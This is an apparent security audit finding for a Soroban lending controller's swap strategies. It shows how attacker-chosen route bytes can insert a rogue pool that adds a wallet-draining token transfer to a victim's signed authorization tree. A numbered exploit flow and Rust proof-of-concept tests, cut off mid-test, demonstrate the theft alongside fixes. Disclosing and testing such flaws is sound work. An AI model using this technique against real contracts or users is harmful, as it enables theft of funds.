### Title
Attacker-controlled route bytes can inject venue code that drains wallet tokens - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary
`swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral` accept opaque route bytes and forward them to the configured router. The controller authorizes only one exact input transfer, but neither decodes the route nor restricts the pool addresses it selects. A crafted route can therefore place attacker-controlled contract code beneath a caller-authorized controller invocation. If the victim signs the authorization tree generated by simulation, the malicious venue can add a nested token transfer from the victim's wallet to the attacker.

### Finding Description
`process_swap_collateral` authenticates the caller and validates ownership, but passes the caller's `swap` bytes into the strategy layer without interpreting their contents. [1](#0-0) 

The router handoff is the vulnerable boundary. `swap_tokens` snapshots the input and output balances, registers exactly one authorization for `token_in.transfer(controller, router, amount_in)`, and invokes `router.execute_strategy(controller, amount_in, swap)`. It does not decode `swap`, inspect the selected venue, or maintain a venue allowlist. [2](#0-1) 

The exact-input authorization prevents the router from pulling arbitrary controller-held input, but it does not prevent route-selected code from attempting unrelated `Address::require_auth` calls against the original caller. Soroban's authorization model records those required invocations beneath the signed root invocation when simulation runs.

The repository contains a focused adversarial test demonstrating the behavior: a route selects an attacker-deployed pool whose `swap` function calls `wallet_token.transfer(victim, attacker, amount)`. Recording-mode simulation records that token transfer as a child invocation under the caller's `swap_collateral` authorization. [3](#0-2) 

With an honest root-only authorization tree, enforcement rejects the rogue transfer. When the victim signs the poisoned tree generated by simulation, the same transaction executes and moves the victim's unrelated wallet token balance to the attacker. [4](#0-3) 

### Impact Explanation
This permits theft of user funds beyond the collateral being swapped.

The victim can lose unrelated tokens held in their wallet because the malicious nested call is not limited to the strategy input token. In the demonstrated flow, the fair swap output is still delivered and the lending position remains solvent, so the controller's balance-delta checks do not detect the theft. [5](#0-4) 

The same route-shaped attack surface is reachable wherever the controller accepts opaque `swap` bytes and forwards them to the router, including `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and the swap leg of `multiply`.

### Likelihood Explanation
The route and malicious venue are fully controlled by an unprivileged attacker. The venue can pay a valid output so the controller's postconditions pass.

Successful theft requires the victim to submit the crafted route and sign the authorization tree containing the unrelated token transfer. This makes the attack dependent on social engineering, a compromised quote/route source, or a client that signs simulated authorization trees without warning. The attack does not require privileged protocol access, a leaked key, or a malicious configured router.

### Recommendation
Do not allow user-supplied routes to invoke arbitrary venue contracts.

Recommended controls:

1. Maintain an on-chain allowlist of accepted venue/pool addresses and reject a route before executing any venue call.
2. Verify venue identity against the encoded venue type rather than trusting the payload's address registry.
3. Expose a decoded, human-readable route summary to transaction builders and wallets so they can reject authorization children outside the expected strategy input transfer.
4. For contract clients, fail closed if simulation produces any caller-authorization child other than the expected token pull.
5. Add regression coverage for every controller strategy accepting `swap` bytes, not only `swap_collateral`.

### Proof of Concept
The adversarial fixture demonstrates the exploit with:

- a router double that invokes the route-selected `hop_pool`; [6](#0-5) 
- an attacker pool that executes `wallet_token.transfer(victim, attacker, amount)`; [7](#0-6) 
- a victim `swap_collateral` invocation containing the crafted route;
- simulation recording the wallet transfer under the victim's `swap_collateral` authorization;
- execution succeeding after the victim signs that recorded authorization tree.

Representative flow:

```text
1. Alice owns USDC collateral and holds an unrelated TOKEN.
2. Attacker deploys RogueHopPool with:
     victim = Alice
     token  = TOKEN
     to     = attacker
     amount = TOKEN.balance(Alice)
3. Attacker gives Alice a swap route whose venue address is RogueHopPool.
4. Alice calls:
     controller.swap_collateral(
       caller = Alice,
       account_id = AliceAccount,
       current = USDC market,
       amount = 1_000 USDC,
       new = ETH market,
       swap = crafted_route
     )
5. The controller authorizes only its intended USDC input transfer and calls
   router.execute_strategy(controller, amount, crafted_route).
6. Route-selected RogueHopPool invokes:
     TOKEN.transfer(Alice, attacker, full_balance)
7. Simulation records that call as a child authorization.
8. Alice signs the poisoned authorization tree.
9. The swap produces fair ETH collateral, while Alice's entire unrelated TOKEN
   wallet balance moves to the attacker.
```

The explicit tests show both branches: a root-only signed tree rejects the rogue transfer, while the simulation-derived tree containing the rogue child authorizes it and drains the wallet. [8](#0-7)

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
